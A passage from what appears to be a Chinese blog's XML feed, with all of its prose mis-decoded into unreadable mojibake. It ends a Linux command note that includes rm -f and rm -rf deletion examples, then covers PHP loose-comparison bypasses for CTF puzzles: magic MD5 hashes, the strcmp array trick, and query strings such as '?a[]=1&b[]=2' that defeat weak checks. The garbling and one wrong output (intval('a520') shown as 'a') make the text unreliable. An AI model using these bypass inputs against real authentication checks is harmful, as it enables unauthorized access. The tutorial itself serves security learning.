é€‰é¡¹ éœ€è¦ç§»é™¤çš„æ–‡æ¡£è·¯å¾„</p><ul><li><p>rm -f éœ€è¦ç§»é™¤çš„æ–‡æ¡£è·¯å¾„</p><p>forceï¼šè¡¨ç¤ºå¼ºåˆ¶åˆ é™¤ï¼Œä¸æç¤ºæ˜¯å¦åˆ é™¤</p></li><li><p>rm -r éœ€è¦ç§»é™¤çš„æ–‡ä»¶å¤¹è·¯å¾„</p><p>-rï¼šè¡¨ç¤ºé€’å½’ï¼Œåˆ é™¤ä¸€ä¸ªç›®å½•çš„æ—¶å€™éœ€è¦åšé€’å½’åˆ é™¤ï¼Œå¹¶ä¸”ä¸€èˆ¬ä¹Ÿä¸éœ€è¦è¿›è¡Œåˆ é™¤ç¡®è®¤è¯¢é—®ï¼Œæ‰€ä»¥ç§»é™¤ç›®å½•çš„æ—¶å€™ä¸€èˆ¬éœ€è¦ä½¿ç”¨-rfé€‰é¡¹</p></li><li><p>rm -rf æ–‡æ¡£è·¯å¾„/æ–‡ä»¶å¤¹è·¯å¾„/â€¦</p><p>åˆ é™¤å¤šä¸ªæ–‡æ¡£å’Œæ–‡ä»¶å¤¹</p></li></ul></li></ul><br><p>æ³¨ï¼š</p><p>è¦åˆ é™¤ä¸€ä¸ªç›®å½•ä¸‹æœ‰å…¬å…±ç‰¹æ€§çš„æ–‡æ¡£ï¼Œä¾‹å¦‚ä»¥testå¼€å¤´çš„æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦<code>*</code></p><p>rm -f test*</p><p>è¡¨ç¤ºå¼ºåˆ¶åˆ é™¤åªè¦æ–‡ä»¶æ˜¯ä»¥testå¼€å¤´çš„ï¼Œåç»­å­—ç¬¦ä¸ç®¡çš„æ–‡æ¡£</p><br><h3 id="è¾“å‡ºé‡å®šå‘"><a href="#è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å‡ºé‡å®šå‘"></a>è¾“å‡ºé‡å®šå‘</h3><p>ä¸€èˆ¬å‘½ä»¤çš„è¾“å‡ºéƒ½ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸­ï¼Œæœ‰äº›æ—¶å€™éœ€è¦å°†ä¸€äº›å‘½ä»¤çš„æ‰§è¡Œç»“æœæƒ³è¦ä¿å­˜åˆ°æ–‡ä»¶ä¸­è¿›è¡Œåç»­çš„åˆ†æ/ç»Ÿè®¡ï¼Œåˆ™è¿™æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°çš„è¾“å‡ºé‡å®šå‘æŠ€æœ¯ã€‚</p><p><code>&gt;</code>ï¼š<strong>è¦†ç›–</strong>è¾“å‡ºï¼Œä¼šè¦†ç›–æ‰åŸå…ˆçš„æ–‡ä»¶å†…å®¹</p><p><code>&gt;&gt;</code>ï¼š<strong>è¿½åŠ </strong>è¾“å‡ºï¼Œä¸ä¼šè¦†ç›–åŸå§‹æ–‡ä»¶å†…å®¹ï¼Œä¼šåœ¨åŸå§‹å†…å®¹æœ«å°¾ç»§ç»­æ·»åŠ </p><ul><li>æ­£å¸¸æ‰§è¡Œçš„æŒ‡ä»¤ &gt;/&gt;&gt; æ–‡ä»¶çš„è·¯å¾„</li></ul><p>æ³¨ï¼šæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ–°å»º</p><p>å¦‚ï¼šä½¿ç”¨è¦†ç›–é‡å®šå‘ï¼Œä¿å­˜ ls -lah çš„æ‰§è¡Œç»“æœåˆ°å½“å‰ç›®å½•ä¸‹çš„ ls.txt</p><p>ls -lah &gt; ls.txt</p><br><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><ul><li>cat æ–‡æ¡£è·¯å¾„</li></ul><p>ç›´æ¥æ‰“å¼€ä¸€ä¸ªæ–‡æ¡£ï¼Œç»“æœè¾“å‡ºåœ¨ç»ˆç«¯</p><ul><li>cat æ–‡æ¡£è·¯å¾„1 æ–‡æ¡£è·¯å¾„2 â€¦ æ–‡æ¡£è·¯å¾„n &gt; æ–‡æ¡£è·¯å¾„x</li></ul><p>é…åˆè¾“å‡ºé‡å®šå‘ï¼Œå°†æ–‡æ¡£è·¯å¾„1åˆ°æ–‡æ¡£è·¯å¾„nçš„å†…å®¹åˆå¹¶åˆ°æ–‡æ¡£è·¯å¾„x</p><br><h3 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h3><p>ç®¡é“ç¬¦ï¼š<code>|</code></p><p>ç®¡é“ä¸€èˆ¬å¯ä»¥ç”¨äºâ€œè¿‡æ»¤â€ï¼Œâ€œç‰¹æ®Šâ€ï¼Œâ€œæ‰©å±•å¤„ç†â€ã€‚</p><ul><li>æŒ‡ä»¤A | æŒ‡ä»¤B</li></ul><p>æŒ‡ä»¤Açš„æ­£ç¡®è¾“å‡ºä½œä¸ºæŒ‡ä»¤Bçš„æ“ä½œå¯¹è±¡</p><p><a href="https://imgchr.com/i/BzxVwF"><img src="https://s3.ax1x.com/2020/11/12/BzxVwF.png" alt="BzxVwF.png"></a></p><blockquote><p>grepæŒ‡ä»¤ï¼šä¸»è¦ç”¨äºè¿‡æ»¤</p></blockquote><br><h3 id="du-sh"><a href="#du-sh" class="headerlink" title="du -sh"></a>du -sh</h3><ul><li>du -sh ç›®å½•è·¯å¾„</li></ul><p>æŸ¥çœ‹ç›®å½•çš„çœŸå®å¤§å°</p><p>-sï¼šsummariesï¼Œåªæ˜¾ç¤ºæ±‡æ€»çš„å¤§å°</p><p>-hï¼šè¡¨ç¤ºä»¥é«˜å¯è¯»æ€§çš„å½¢å¼è¿›è¡Œæ˜¾ç¤º</p><p>å¦‚ï¼šç»Ÿè®¡â€/etcâ€œç›®å½•å®é™…å¤§å°</p><p>du -sh /etc/</p><br><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p><a href="https://imgchr.com/i/Bzzenf"><img src="https://s3.ax1x.com/2020/11/12/Bzzenf.png" alt="Bzzenf.png"></a></p><p><code>%F</code>ï¼šç­‰ä»·äº<code>%Y-%m-%d</code></p><p><code>%T</code>ï¼šç­‰ä»·äº<code>%H:%M:%S</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%Fï¼šè¡¨ç¤ºå®Œæ•´çš„å¹´æœˆæ—¥</span><br><span class="line">%Tï¼šè¡¨ç¤ºå®Œæ•´çš„æ—¶åˆ†ç§’</span><br><span class="line">%Yï¼šè¡¨ç¤ºå››ä½å¹´ä»½</span><br><span class="line">%mï¼šè¡¨ç¤ºä¸¤ä½æœˆä»½ï¼ˆå¸¦å‰å¯¼0ï¼‰</span><br><span class="line">%dï¼šè¡¨ç¤ºæ—¥æœŸï¼ˆå¸¦å‰å¯¼0ï¼‰</span><br><span class="line">%Hï¼šè¡¨ç¤ºå°æ—¶ï¼ˆå¸¦å‰å¯¼0ï¼‰</span><br><span class="line">%Mï¼šè¡¨ç¤ºåˆ†é’Ÿï¼ˆå¸¦å‰å¯¼0ï¼‰</span><br><span class="line">%Sï¼šè¡¨ç¤ºç§’æ•°ï¼ˆå¸¦å‰å¯¼0ï¼‰</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜</title>
      <link href="2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/"/>
      <url>2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<ul><li><p>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œè¢«è½¬æ¢ä¸º0ã€‚</p></li><li><p>bool trueå’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0è®¤ä¸ºæ˜¯bool falseã€‚</p></li><li><p>md5æˆ–è€…shaä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›falseã€‚</p></li><li><p>â€œ0xâ€å¼€å¤´è·Ÿæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€0x1e240â€ï¼‰ä¼šè¢«å½“ä½œ16è¿›åˆ¶æ•°å»æ¯”è¾ƒã€‚</p></li><li><p>åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼Œåé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå³<code>0e\d+</code>çš„å­—ç¬¦ä¸² == â€˜0â€™ ä¸ºtrueã€‚</p></li><li><p>PHP5.3ä»¥ä¸Šç‰ˆæœ¬çš„strcmp()å­˜åœ¨æ¼æ´ï¼Œåªè¦$_GET[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ç»•è¿‡ã€‚</p></li></ul><a id="more"></a><table><thead><tr><th>å­—ç¬¦ä¸²</th><th>md5()</th></tr></thead><tbody><tr><td>240610708</td><td>0e462097431906509019562988736854</td></tr><tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><p>å‚è€ƒï¼š</p><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php">PHPå®˜æ–¹æ‰‹å†Œâ€”â€”æ¯”è¾ƒè¿ç®—ç¬¦</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/99709333?biz_id=102&utm_term=php%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-99709333&spm=1018.2118.3001.4187">PHP å¼±ç±»å‹æ¯”è¾ƒæ€»ç»“</a></p><h2 id="PHP-å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜"><a href="#PHP-å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜" class="headerlink" title="PHP å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜"></a>PHP å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜</h2><p>PHPæ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼Œå­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ã€‚</p><h3 id="â€œ-â€ä¸â€œ-â€"><a href="#â€œ-â€ä¸â€œ-â€" class="headerlink" title="â€œ==â€ä¸â€œ===â€"></a>â€œ==â€ä¸â€œ===â€</h3><p><code>==</code>  æ•°æ®ç±»å‹ä¸ä¸€æ ·çš„æ—¶å€™ä¼šå°†æ•°æ®ç±»å‹è½¬æ¢ä¸ºç›¸åŒçš„å†è¿›è¡Œæ¯”è¾ƒ</p><p><code>===</code>   é™¤äº†å¯¹æ•°æ®çš„å€¼è¿›è¡Œæ¯”è¾ƒè¿˜ä¼šå¯¹æ•°æ®çš„ç±»å‹è¿›è¡Œæ¯”è¾ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o = $_GET[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($o))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($o==<span class="number">520</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;U are right!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>è¾“å…¥520ï¼Œåˆ™ï¼šno hack!!</p><p>è¾“å…¥520aï¼Œåˆ™ï¼šU are right!</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;520a&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;a520&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>520</p><p>a</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span>==<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;0e12&#x27;</span> == <span class="string">&#x27;0e34&#x27;</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;0e12&#x27;</span> === <span class="string">&#x27;0e34&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)</p></blockquote><h3 id="switchå¼±ç±»å‹æ¯”è¾ƒé—®é¢˜"><a href="#switchå¼±ç±»å‹æ¯”è¾ƒé—®é¢˜" class="headerlink" title="switchå¼±ç±»å‹æ¯”è¾ƒé—®é¢˜"></a>switchå¼±ç±»å‹æ¯”è¾ƒé—®é¢˜</h3><p>switchä¸­åŒæ ·å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ï¼ŒåŸç†å’Œä¸Šé¢ç±»ä¼¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i =<span class="string">&quot;3a&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;this is two&quot;</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¾“å‡º flag</p><h3 id="å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ"><a href="#å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ" class="headerlink" title="å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ"></a>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ</h3><p><strong>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œè¢«è½¬æ¢ä¸º0ã€‚</strong></p><p>å¦‚ï¼šâ€aâ€æˆ–â€a1â€æ˜¯ä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œè€Œâ€1â€æˆ–â€1aâ€æ˜¯å¯ä»¥è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;a&#x27;</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span> == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&#x27;1a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;a1&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;12a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(false)</p></blockquote><h3 id="å¸ƒå°”å€¼trueå’Œä»»æ„æ¯”è¾ƒ"><a href="#å¸ƒå°”å€¼trueå’Œä»»æ„æ¯”è¾ƒ" class="headerlink" title="å¸ƒå°”å€¼trueå’Œä»»æ„æ¯”è¾ƒ"></a>å¸ƒå°”å€¼trueå’Œä»»æ„æ¯”è¾ƒ</h3><p><strong>bool trueå’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0è®¤ä¸ºæ˜¯bool falseã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="number">2</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(false)<br>bool(true)<br>bool(true)<br>bool(true)</p></blockquote><h3 id="md5-ã€sha1-å“ˆå¸Œå‡½æ•°ç›¸ç­‰é—®é¢˜"><a href="#md5-ã€sha1-å“ˆå¸Œå‡½æ•°ç›¸ç­‰é—®é¢˜" class="headerlink" title="md5()ã€sha1()å“ˆå¸Œå‡½æ•°ç›¸ç­‰é—®é¢˜"></a>md5()ã€sha1()å“ˆå¸Œå‡½æ•°ç›¸ç­‰é—®é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;a&#x27;</span>] != $_GET[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¦å¾—åˆ°flagï¼Œå¾—æƒ³åŠæ³•è®©aå’Œbçš„å€¼ä¸ç›¸ç­‰ï¼Œä½†md5åŠ å¯†åçš„<strong>å€¼</strong>ç›¸ç­‰ã€‚</p><p>ç”±äº<strong>md5æˆ–è€…shaä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›falseã€‚</strong></p><p>åˆ©ç”¨è¿™ç‚¹ï¼Œç»™aå’Œbåˆ†åˆ«ä¼ å‚ä¸¤ä¸ªä¸åŒçš„æ•°ç»„ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="åå…­è¿›åˆ¶æ¯”è¾ƒé—®é¢˜"><a href="#åå…­è¿›åˆ¶æ¯”è¾ƒé—®é¢˜" class="headerlink" title="åå…­è¿›åˆ¶æ¯”è¾ƒé—®é¢˜"></a>åå…­è¿›åˆ¶æ¯”è¾ƒé—®é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        $digit = ord($number&#123;$i&#125;);</span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( fun($_GET[<span class="string">&#x27;a&#x27;</span>]) )</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</p></blockquote><p>è¿™é“é¢˜çš„æ„æ€å°±æ˜¯è¦æ±‚è¾“å…¥ä¸€ä¸ªkeyï¼Œç„¶åè¿™ä¸ªkeyå¿…é¡»ç­‰äº<code>54975581388</code>ï¼Œä½†æ˜¯åœ¨è‡ªå®šä¹‰çš„å‡½æ•°é‡Œé¢åˆä¸å…è®¸å‡ºç°æ•°å­—1åˆ°9ï¼Œæ­£å¥½<code>54975581388=0xccccccccc</code>è¿™æ ·å°±ç»•è¿‡äº†æ£€æµ‹ã€‚</p><p><strong>â€œ0xâ€å¼€å¤´è·Ÿæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€0x1e240â€ï¼‰ä¼šè¢«å½“ä½œ16è¿›åˆ¶æ•°å»æ¯”è¾ƒã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0x1e240</span> == <span class="number">123456</span>);</span><br><span class="line">var_dump(<span class="number">54975581388</span> == <span class="number">0xccccccccc</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(true)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;0xccccccccc</span><br></pre></td></tr></table></figure><h3 id="hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ"><a href="#hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ" class="headerlink" title="hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ"></a>hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ</h3><p>åœ¨æ¯”è¾ƒçš„æ—¶å€™ï¼Œå½“å‡ºç°xexæ¨¡å¼ï¼Œå°†ä¼šå½“åšç§‘å­¦è®¡æ•°æ³•è¿›è¡Œæ¯”è¾ƒã€‚</p><p>è€Œ<strong>åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼Œåé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå³<code>0e\d+</code>çš„å­—ç¬¦ä¸² == â€˜0â€™ ä¸ºtrueã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str1);</span><br><span class="line">var_dump(md5($str1) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">&quot;s224534898e&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str2);</span><br><span class="line">var_dump(md5($str2) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$str3 = <span class="string">&#x27;a1b2edaced&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str3);</span><br><span class="line">var_dump(md5($str3) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>0cc175b9c0f1b6a831c399e269772661<br>bool(false)<br>0e420233178946742799316739797882<br>bool(true)<br>0e45ea817f33691a3dd1f46af81166c4<br>bool(false)</p></blockquote><h3 id="PHP-ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦"><a href="#PHP-ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="PHP ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦"></a>PHP ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦</h3><p>ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œç¬¦å·ä¸ºï¼š&lt;=&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c = $a 